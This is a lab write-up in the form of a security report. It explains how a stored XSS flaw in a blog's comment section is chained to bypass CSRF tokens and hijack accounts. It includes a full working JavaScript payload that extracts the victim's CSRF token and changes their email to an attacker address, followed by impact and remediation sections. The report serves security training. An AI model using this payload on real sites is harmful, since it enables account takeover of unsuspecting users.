# Lab: Bypassing CSRF protection via Stored XSS

**Severity:** High

**Vulnerability Type:** Stored Cross-Site Scripting (XSS)/Cross-Site Request Forgery (CSRF) Bypass

**Target:** Web Security Academy Blog-User Account Functionality 

##### 1. Executive Summary 

A security assessment of the "We Like to Blog" application revealed a Stored
Cross-Site Scripting (XSS) vulnerability that can be chained to bypass Anti-
Cross-Site Request Forgery (CSRF) mechanisms.

While the application correctly implements CSRF tokens to prevent unauthorised
state-changing requests (such as changing an email address), the Stored XSS
vulnerability allows an attacker to execute JavaScript within the victim's 
session. This script can programmatically retrieve a valid CSRF token from the 
application and use it to submit a fraudulent request, effectively nullifying
the CSRF protection. 

##### 2. Technical Walkthrough 

2.1 Target Identifcation 

The target functionality is the user account management page, specifically the
"Change Email" feature. This feature is protected by a randomly generated Anti-
CSRF token, which typically prevents attackers from forging requests from 
external sites. 

<img width="1186" height="745" alt="c1" src="https://github.com/user-attachments/assets/1f900760-521f-4388-8737-da29985978f1" />

2.2 Attack Logic

Standard CSRF attacks fail here because the attacker cannot guess the victim's
unique CSRF token. However, by leveraging the Stored XSS vulnerability in the
comments section, we can execute JavaScript inside the victim's valid 
session. 

The attack flow is as follows:

1. Read: The malicious script sends a GET request to the `/my-account` page
(where the change-email form lives).

2. Parse: The script parses the HTML response to find the hidden `csrf` input
field.

3. Extract: It extracts the valid token value.

4. Execute: It constructs a new POST request to `/my-account/change-email`
using the stolen token and the attacker's email address.

2.3 Payload Construction 

The following JavaScript payload was injected into the blog comment section.
It uses the `DOMParser` API to read the HTML of the account page and extract
the token before submitting the malicious request. 

```
<script>
// 1. Fetch the account page to get the fresh CSRF token
fetch('/my-account')
  .then(response => response.text())
  .then(text => {
    // 2. Parse the HTML response
    var parser = new DOMParser();
    var doc = parser.parseFromString(text, 'text/html');

    // 3. Extract the CSRF token 
    // (Note: Index [1] was selected as the specific form token required)
    var token = doc.getElementsByName('csrf')[1].value;

    // 4. Construct the payload with the stolen token and new email
    var newEmail = 'pwned@attacker.com';
    var data = 'email=' + newEmail + '&csrf=' + token;

    // 5. Submit the authenticated POST request
    fetch('/my-account/change-email', {
        method: 'POST',
        mode: 'same-origin',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: data
    });
  });
</script>
```

<img width="1440" height="758" alt="c2" src="https://github.com/user-attachments/assets/63bb0002-1c20-452d-a218-ed632be9d31a" />

2.4 Execution 

Upon viewing the blog post containing the malicious comment, the script 
executed immediately in the background. The user's email was successfully 
changed without their interaction or consent.

<img width="1185" height="744" alt="c3" src="https://github.com/user-attachments/assets/92703f45-2e10-4aa7-a41b-bedad347a5a4" />

##### 3. Impact Analysis

The impact is rated as High.

- Account Takeover: By changing the email address to one controlled by the
attacker, the attacker can subsequently initiate a "Forgot Password" flow
to reset the victim's password and take full control of the account.

- Defense Nullification: This vulnerability demonstrates that Anti-CSRF
tokens are ineffective if the application is vulnerable to XSS.

##### 4. Remediation

To mitigate this vulnerability, the primary focus must be on eliminating the
XSS flaw, as it is the root cause that allows the CSRF bypass.

1. Prevent XSS: Implement strict context-aware output encoding for all user-
generated content (comments) to prevent the execution of malicious scripts.

2. Re-authentication: For sensitive actions like changing an email or
password, require the user to re-enter their current password. This prevents
the script from succeding even if it has the CSRF token, as the script
cannot read the user's password from memory. 
